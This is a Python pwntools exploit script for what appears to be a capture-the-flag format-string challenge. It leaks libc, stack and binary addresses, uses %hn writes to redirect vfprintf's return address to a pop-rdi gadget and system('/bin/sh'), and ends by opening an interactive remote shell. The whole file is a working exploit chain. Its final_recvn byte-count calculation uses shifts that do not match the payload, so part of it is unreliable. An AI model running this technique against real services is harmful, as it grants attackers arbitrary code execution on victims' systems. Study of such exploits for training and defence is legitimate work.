from pwn import *

context.arch = 'amd64'

# host = 'csie.ctf.tw'
# port = 10136
host = '127.0.0.1'
port = 8888
r = remote(host, port)

local = True if host == '127.0.0.1' else False

if local: input('Press Enter to continue.')

idx_libc_csu_init = 8
idx_libc_start_main_240 = 9
idx_and_argv = 11
idx_argv = idx_and_argv + 0xd*2

__libc_start_main_off = 0x0000000000020740
system_off = 0x0000000000045390
execve_off = 0x00000000000cc770

# leak memory & stack address
r.recvuntil(':')
payload = '%' + str(idx_libc_start_main_240) + '$p'
payload += '%' + str(idx_and_argv) + '$p'
payload += '%' + str(idx_libc_csu_init) + '$p'
payload += 'x'
payload = payload.encode()
r.sendline(payload)

# leak libc address
r.recvuntil('0x')
__libc_start_main_240 = int(r.recvuntil('0x')[:-2], 16)
__libc_start_main = __libc_start_main_240 - 240
libc = __libc_start_main - __libc_start_main_off

# calculate system address
system = system_off + libc
execve = execve_off + libc
print('system        = ', hex(system))
print('execve        = ', hex(execve))

# leak argv address on stack
argv = int(r.recvuntil('0x')[:-2], 16)
print('argv          = ', hex(argv))

# calculate iter on stack
iter_i = argv - (0x7fff9bf081b8 - 0x7fff9bf080c8) + 4
vfprintf_ret = argv + 0x7ffd77a08cf8 - 0x7ffd77a08ed8
printf_ret = vfprintf_ret + (0x7ffc71bca058 - 0x7ffc71bc9f78)
print('iter_i        = ', hex(iter_i))
print('vfprintf_ret  = ', hex(vfprintf_ret))
print('printf_ret    = ', hex(printf_ret))

# pick a new argv[0]
# argvs[0] = argv + 0x8
# idx_argvs[0] = idx_argv + 1

# pick new argvs
argvs = [argv+0x8, argv+0x10, argv+0x18, argv+0x20, argv+0x28, argv+0x30, argv+0x38]
idx_argvs = [idx_argv+1, idx_argv+2, idx_argv+3, idx_argv+4, idx_argv+5, idx_argv+6, idx_argv+7]

# leak buf address
__libc_csu_init = int(r.recvuntil('x')[:-1], 16)
pop_rdi = __libc_csu_init + 99
buf = __libc_csu_init + (0x555555755020 - 0x555555554a80)
print('pop_rdi       = ', hex(pop_rdi))
print('buf           = ', hex(buf))

def fmt(prev, val, idx, byte):
    if byte == 1:
        prev &= 0xff
        full = 0x100
        hn_hnn = '$hhn'
    elif byte == 2:
        prev &= 0xffff
        full = 0x10000
        hn_hnn = '$hn'
    ret = ''
    if val > prev:
        ret = '%' + str(val - prev) + 'c'
    elif val < prev:
        ret = '%' + str(full + val - prev) + 'c'
    ret += '%' + str(idx) + hn_hnn
    return ret.encode()

def fmt_recvn(prev, val, byte):
    if byte == 1:
        prev &= 0xff
        full = 0x100
    elif byte == 2:
        prev &= 0xffff
        full = 0x10000
    if val > prev:
        ret = val - prev
    elif val < prev:
        ret = full + val - prev
    return ret

def fmt_send_recv(val, idx, byte):
    payload = fmt(0, val, idx, byte)
    r.recvuntil(':')
    r.send(payload)
    r.recvn(val)

def fmt_make_new_addr(argv_id, addr):
    """Make a new address on idx_argvs[argv_id]."""
    global idx_argv
    global idx_and_argv
    global argvs

    fmt_send_recv(argvs[argv_id] & 0xff, idx_and_argv, 1)
    fmt_send_recv(addr & 0xffff, idx_argv, 2)

    fmt_send_recv((argvs[argv_id]+0x2) & 0xff, idx_and_argv, 1)
    fmt_send_recv((addr>>0x10) & 0xffff, idx_argv, 2)

    fmt_send_recv((argvs[argv_id]+0x4) & 0xff, idx_and_argv, 1)
    fmt_send_recv((addr>>0x20) & 0xffff, idx_argv, 2)

    fmt_send_recv((argvs[argv_id]+0x6) & 0xff, idx_and_argv, 1)
    fmt_send_recv(0x10000, idx_argv, 2)

    fmt_send_recv(argvs[0] & 0xff, idx_and_argv, 1)

# make more loop
# TODO: make this more robust by overwriting more bytes
if local: input('Make more loop.')
fmt_send_recv(iter_i&0xffff, idx_and_argv, 2)
fmt_send_recv(0xffff, idx_argv, 2)

if local: input('make argv[1] be vfprintf_ret')
fmt_send_recv(argvs[1]&0xffff, idx_and_argv, 2)
fmt_make_new_addr(1, vfprintf_ret)

if local: input('make argv[2] be vfprintf_ret+2')
fmt_send_recv(argvs[2]&0xffff, idx_and_argv, 2)
fmt_make_new_addr(2, vfprintf_ret+2)

if local: input('make argv[3] be vfprintf_ret+4')
fmt_send_recv(argvs[3]&0xffff, idx_and_argv, 2)
fmt_make_new_addr(3, vfprintf_ret+4)

if local: input('make argv[4] be vfprintf_ret+0x10')
fmt_send_recv(argvs[4]&0xffff, idx_and_argv, 2)
fmt_make_new_addr(4, vfprintf_ret+0x10)

if local: input('make argv[5] be vfprintf_ret+0x10+2')
fmt_send_recv(argvs[5]&0xffff, idx_and_argv, 2)
fmt_make_new_addr(5, vfprintf_ret+0x10+2)

if local: input('make argv[6] be vfprintf_ret+0x10+4')
fmt_send_recv(argvs[6]&0xffff, idx_and_argv, 2)
fmt_make_new_addr(6, vfprintf_ret+0x10+4)

fmt_send_recv(argvs[0]&0xffff, idx_and_argv, 2)

# replace vfprintf_ret with system, and put in '/bin/sh'
if local: input('Write payload[0x10:] to buf.')

# create final payload
target = pop_rdi
final_payload = fmt(0, target & 0xffff, idx_argvs[1], 2)
final_payload += fmt(target & 0xffff, (target>>0x10) & 0xffff, idx_argvs[2], 2)
final_payload += fmt((target>>0x10) & 0xffff, (target>>0x20) & 0xffff, idx_argvs[3], 2)

target2 = system
final_payload += fmt((target>>0x20) & 0xffff, target2 & 0xffff, idx_argvs[4], 2)
final_payload += fmt(target2 & 0xffff, (target2>>0x10) & 0xffff, idx_argvs[5], 2)
final_payload += fmt((target2>>0x10) & 0xffff, (target2>>0x20) & 0xffff, idx_argvs[6], 2)

print(len(final_payload))
final_payload = final_payload.ljust(0x50, b'\x00')
print(len(final_payload))
print(final_payload)

final_recvn = 0
final_recvn += fmt_recvn(0, target & 0xffff, 2)
final_recvn += fmt_recvn(target & 0xffff, (target>>0x16) & 0xffff, 2)
final_recvn += fmt_recvn((target>>0x8) & 0xffff, (target>>0x32) & 0xffff, 2)
final_recvn += fmt_recvn((target>>0x20) & 0xffff, target2 & 0xffff, 2)
final_recvn += fmt_recvn(target2 & 0xffff, (target2>>0x10) & 0xffff, 2)
final_recvn += fmt_recvn((target2>>0x10) & 0xffff, (target2>>0x20) & 0xffff, 2)

def fmt_write_to_addr(val, addr):
    global idx_argvs

    fmt_make_new_addr(0, addr)
    fmt_send_recv(val & 0xffff, idx_argvs[0], 2)

    fmt_make_new_addr(0, addr+2)
    fmt_send_recv((val>>0x10) & 0xffff, idx_argvs[0], 2)

    fmt_make_new_addr(0, addr+4)
    fmt_send_recv((val>>0x20) & 0xffff, idx_argvs[0], 2)

    fmt_make_new_addr(0, addr+6)
    fmt_send_recv((val>>0x30) & 0xffff, idx_argvs[0], 2)

fmt_write_to_addr(u64(final_payload[0x10:0x18]), buf+0x10)
fmt_write_to_addr(u64(final_payload[0x18:0x20]), buf+0x18)
fmt_write_to_addr(u64(final_payload[0x20:0x28]), buf+0x20)
fmt_write_to_addr(u64(final_payload[0x28:0x30]), buf+0x28)
fmt_write_to_addr(u64(final_payload[0x30:0x38]), buf+0x30)
fmt_write_to_addr(u64(final_payload[0x38:0x40]), buf+0x38)
fmt_write_to_addr(u64(final_payload[0x40:0x48]), buf+0x40)
fmt_write_to_addr(u64(final_payload[0x48:0x50]), buf+0x48)

fmt_write_to_addr(u64(b'/bin/sh\x00'), vfprintf_ret+0x8)

if local: input('Overwrite vfprintf_ret to: {}.'.format(hex(target)))

r.send(final_payload[:0x10])
r.recvn(final_recvn)
print("FINISH")

r.interactive()
